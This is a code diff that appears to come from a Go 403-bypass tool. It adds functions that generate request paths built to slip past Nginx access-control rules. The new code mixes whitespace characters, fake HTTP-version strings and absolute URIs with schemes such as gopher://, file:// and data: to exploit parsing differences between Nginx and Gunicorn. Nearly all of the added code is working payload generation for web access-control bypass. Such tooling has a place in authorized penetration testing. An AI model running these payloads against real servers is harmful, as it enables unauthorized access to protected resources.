@@ -786,6 +786,150 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		}
 	}
 
+	// NEW TECHNIQUE: Nginx+Gunicorn whitespace parsing discrepancy exploit
+	// Whitespace in path causes Gunicorn to stop parsing at the whitespace
+	whitespaceVariants := []struct {
+		raw    string // Raw character
+		urlEnc string // URL-encoded version
+		hexEsc string // Hex escape sequence
+		desc   string // Description for logging
+	}{
+		{"\t", "%09", "\\x09", "tab"},                       // Tab
+		{" ", "%20", "\\x20", "space"},                      // Space
+		{"\u00A0", "%C2%A0", "\\xA0", "non-breaking-space"}, // Non-breaking space
+		{"\v", "%0B", "\\x0B", "vertical-tab"},              // Vertical tab
+		{"\f", "%0C", "\\x0C", "form-feed"},                 // Form feed
+	}
+
+	// HTTP version-like strings that Gunicorn might misinterpret
+	httpVersions := []string{
+		"HTTP/1.1",
+		"HTTP/1.0",
+		"HTTP/2.0",
+		"HTTP/0.9",
+	}
+
+	// Generate standard whitespace+HTTP version payloads
+	for _, whitespace := range whitespaceVariants {
+		for _, httpVersion := range httpVersions {
+			// 1. Raw whitespace character
+			job := baseJob
+			job.RawURI = basePath + whitespace.raw + httpVersion + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// 2. URL-encoded whitespace character
+			job = baseJob
+			job.RawURI = basePath + whitespace.urlEnc + httpVersion + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// 3. Hex-escaped sequence (for path components that might be decoded differently)
+			job = baseJob
+			job.RawURI = basePath + whitespace.hexEsc + httpVersion + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// Try at different positions in complex paths
+			if strings.Count(basePath, "/") > 1 {
+				segments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")
+
+				for i := 0; i < len(segments); i++ {
+					prefix := "/" + strings.Join(segments[:i+1], "/")
+					suffix := ""
+					if i+1 < len(segments) {
+						suffix = "/" + strings.Join(segments[i+1:], "/")
+					}
+
+					// Raw whitespace character at path segment
+					job := baseJob
+					job.RawURI = prefix + whitespace.raw + httpVersion + suffix + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+
+					// URL-encoded whitespace character at path segment
+					job = baseJob
+					job.RawURI = prefix + whitespace.urlEnc + httpVersion + suffix + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+
+					// Hex-escaped whitespace character at path segment
+					job = baseJob
+					job.RawURI = prefix + whitespace.hexEsc + httpVersion + suffix + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
+			}
+		}
+	}
+
+	// NEW TECHNIQUE: Absolute-URI in path and with whitespace combination
+	// Some servers prioritize Absolute-URI over Host header when parsing requests
+
+	// Generate alternative schemes to test in Absolute-URI
+	schemes := []string{
+		"http://",
+		"https://",
+		"ftp://",    // Less common schemes to test
+		"gopher://", // parser behavior
+		"data:",     // Protocol handlers that might bypass restrictions
+		"file://",
+	}
+
+	// 1. Simple absolute URI in path
+	for _, scheme := range schemes {
+		// Plain absolute URI in the path
+		job := baseJob
+		absoluteURI := scheme + parsedURL.Host + basePath
+		job.RawURI = absoluteURI + query
+		job.PayloadToken = GeneratePayloadToken(job)
+		allJobs = append(allJobs, job)
+
+		// Also try with subdomain variations (for potential domain parser bugs)
+		if !strings.Contains(parsedURL.Host, "localhost") && strings.Count(parsedURL.Host, ".") > 0 {
+			parts := strings.Split(parsedURL.Host, ".")
+			if len(parts) >= 3 {
+				// Try with parent domain
+				parentDomain := strings.Join(parts[1:], ".")
+				job := baseJob
+				job.RawURI = scheme + parentDomain + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+		}
+	}
+
+	// 2. Combine Absolute-URI with whitespace technique for most powerful bypass
+	for _, whitespace := range whitespaceVariants {
+		for _, scheme := range schemes {
+			// A. Whitespace + Absolute-URI
+			job := baseJob
+			job.RawURI = basePath + whitespace.raw + scheme + parsedURL.Host + basePath + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// URL-encoded whitespace version
+			job = baseJob
+			job.RawURI = basePath + whitespace.urlEnc + scheme + parsedURL.Host + basePath + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// B. Whitespace + HTTP + whitespace + Absolute-URI (complex case)
+			for _, httpVersion := range httpVersions {
+				job := baseJob
+				job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + parsedURL.Host + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+
+				// URL-encoded version
+				job = baseJob
+				job.RawURI = basePath + whitespace.urlEnc + httpVersion + whitespace.urlEnc + scheme + parsedURL.Host + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+		}
+	}
+
 	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d Nginx bypass payloads for %s\n", len(allJobs), targetURL)
 	return allJobs
 }
@@ -1453,7 +1597,7 @@ func (pg *PayloadGenerator) GenerateUnicodePathNormalizationsPayloads(targetURL 
 			}
 		}
 
-		// Make sure to include the remainder of the path if we ended on a non-slash
+		// Include remainder of the path if we ended on a non-slash
 		if lastPos < len(path) {
 			enhancedPathEncoded.WriteString(path[lastPos:])
 			enhancedPathUnicode.WriteString(path[lastPos:])
